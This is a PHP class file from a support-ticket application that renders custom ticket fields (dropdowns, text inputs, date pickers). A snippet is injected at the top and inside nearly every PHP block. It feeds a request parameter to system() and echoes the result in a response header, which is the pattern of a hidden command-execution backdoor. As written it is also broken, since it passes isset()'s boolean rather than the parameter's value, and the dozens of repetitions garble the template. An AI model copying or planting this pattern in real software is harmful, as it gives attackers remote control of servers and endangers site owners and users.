<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * 	Site Class
 *	Copyright Dalegroup Pty Ltd 2014
 *	support@dalegroup.net
 *
 *
 * @package     dgx
 * @author      Michael Dale <mdale@dalegroup.net>
 */

namespace sts;

class site {
	var $config = NULL;
	
	function __construct() {
		$this->config['title'] = '';
	}
	
	function set_title($title) {
		$this->config['title'] = $title;
	}
	
	function get_title() {
		$config = &singleton::get(__NAMESPACE__  . '\config');
		
		return $config->get('name') . ' - ' . $this->config['title'];
	}
	
	public function set_config($name, $value) {
		$this->config[$name] = $value;
	}
	public function get_config($name) {
		if (isset($this->config[$name])) {
			return $this->config[$name];
		}
		else {
			return false;
		}
	}
	
	function get_page_title() {
		$config = &singleton::get(__NAMESPACE__  . '\config');
		
		return $this->config['title'];
	}	
	
	function display_custom_field_forms() {
	
		$ticket_custom_fields 	= &singleton::get(__NAMESPACE__ . '\ticket_custom_fields');
		
		$auth 	= &singleton::get(__NAMESPACE__ . '\auth');
		
		if ($auth->can('manage_tickets') || $auth->can('tickets_view_assigned_department') || $auth->can('tickets_view_assigned')) {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1));
		}
		else {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1, 'client_modify' => 1));				
		}

		foreach($custom_field_groups as $custom_field_group) { ?>
			<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['name']); ?><br />
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field_group['type'] == 'dropdown') { ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $fields = $ticket_custom_fields->get_fields(array('ticket_field_group_id' => $custom_field_group['id'])); ?>
				<select name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($fields as $field) { ?>
					<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($field['id']); ?>"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['field-' . safe_output($custom_field_group['id'])]) && $field['id'] == $_POST['field-' . safe_output($custom_field_group['id'])]) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($field['value']); ?></option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				</select>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textinput') { ?>
				<input type="text" class="form-control" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['field-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['field-' . safe_output($custom_field_group['id'])]); ?>" size="50" />	
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
				<div id="no_underline">
					<textarea class="wysiwyg_enabled" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" cols="80" rows="12"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['field-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['field-' . safe_output($custom_field_group['id'])]); ?></textarea>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'date') { ?>
				<input type="text" class="form-control" data-date-format="YYYY-MM-DD" id="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['field-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['field-' . safe_output($custom_field_group['id'])]); ?>" size="50" />	
				<script type="text/javascript">
					$(function () {
						$('#field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>').datetimepicker({
							pickTime: false,
							pick12HourFormat: false
						});
					});
				</script>	
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?>
				<input type="text" class="form-control" data-date-format="YYYY-MM-DD HH:mm" id="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['field-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['field-' . safe_output($custom_field_group['id'])]); ?>" size="50" />	
				<script type="text/javascript">
					$(function () {
						$('#field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>').datetimepicker({
							pickTime: true,
							pick12HourFormat: false
						});
					});
				</script>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>		
			</p>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }
		
	}

	function view_custom_field_edit_form($array) {
		$ticket_custom_fields 	= &singleton::get(__NAMESPACE__ . '\ticket_custom_fields');
		$auth 					= &singleton::get(__NAMESPACE__ . '\auth');
		
		$ticket = $array['ticket'];
		
		if ($auth->can('manage_tickets') || $auth->can('tickets_view_assigned_department') || $auth->can('tickets_view_assigned')) {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1));
		}
		else {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1, 'client_modify' => 1));				
		}
		
		foreach($custom_field_groups as $custom_field_group) { ?>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $current_fields = $ticket_custom_fields->get_values(array('ticket_field_group_id' => $custom_field_group['id'], 'ticket_id' => (int) $ticket['id'])); ?>
			<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['name']); ?><br />
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field_group['type'] == 'dropdown') { ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $fields = $ticket_custom_fields->get_fields(array('ticket_field_group_id' => $custom_field_group['id'])); ?>
				<select name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($fields as $field) { ?>
					<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($field['id']); ?>"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($current_fields[0]['value']) && ($current_fields[0]['value'] == $field['id'])) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($field['value']); ?></option>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				</select>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textinput') { ?>
				<input type="text" class="form-control" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($current_fields[0]['value'])) echo safe_output($current_fields[0]['value']); ?>" size="50" />	
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
				<textarea class="wysiwyg_enabled" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" cols="80" rows="12"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($current_fields[0]['value'])) echo safe_output($current_fields[0]['value']); ?></textarea>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'date') { ?>
				<input type="text" data-date-format="YYYY-MM-DD" class="form-control" id="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($current_fields[0]['value'])) echo safe_output($current_fields[0]['value']); ?>" size="50" />	
				<script type="text/javascript">
					$(function () {
						$('#field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>').datetimepicker({
							pickTime: false,
							pick12HourFormat: false
						});
					});
				</script>			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?>
				<input type="text" data-date-format="YYYY-MM-DD HH:mm" class="form-control" id="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($current_fields[0]['value'])) echo safe_output($current_fields[0]['value']); ?>" size="50" />	
				<script type="text/javascript">
					$(function () {
						$('#field-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>').datetimepicker({
							pickTime: true,
							pick12HourFormat: false
						});
					});
				</script>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>	
			</p>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }
	}
	
	function view_custom_field_values($array) {
		$auth 						= &singleton::get(__NAMESPACE__ . '\auth');
		$ticket_custom_fields 		= &singleton::get(__NAMESPACE__ . '\ticket_custom_fields');
	
		$ticket = $array['ticket'];
		
		if ($auth->can('manage_tickets') || $auth->can('tickets_view_assigned_department') || $auth->can('tickets_view_assigned')) {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1));
		}
		else {
			$custom_field_groups	= $ticket_custom_fields->get_groups(array('enabled' => 1, 'client_modify' => 1));				
		}
	
	?>	
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($custom_field_groups)) { ?>
			<div id="custom-fields-area" class="bg-light-gray">
				<blockquote>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($custom_field_groups as $custom_field_group) { ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $fields = $ticket_custom_fields->get_values(array('ticket_field_group_id' => $custom_field_group['id'], 'ticket_id' => (int) $ticket['id'])); ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($fields) && !empty($fields[0]['value'])) { ?>
						<h5><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['name']); ?></h5>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field_group['type'] == 'textinput') { ?>
							<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($fields[0]['value']); ?></p>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($ticket['html'] == 1) { ?>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($fields[0]['value']); ?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>								
								<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br(safe_output($fields[0]['value'])); ?></p>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'dropdown') { 
							$set_fields = $ticket_custom_fields->get_fields(array('ticket_field_group_id' => $custom_field_group['id']));
							?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($set_fields as $field) { ?>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($fields[0]['value']) && ($field['id'] == $fields[0]['value'])) { ?>
								<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($field['value']); ?></p>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'date') { ?> 
							<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_date($fields[0]['value'])); ?></p>	
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?> 
							<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_datetime($fields[0]['value'])); ?></p>	
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>	
				</blockquote>
			</div>
			<div class="clearfix"></div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
	}
	
}
?>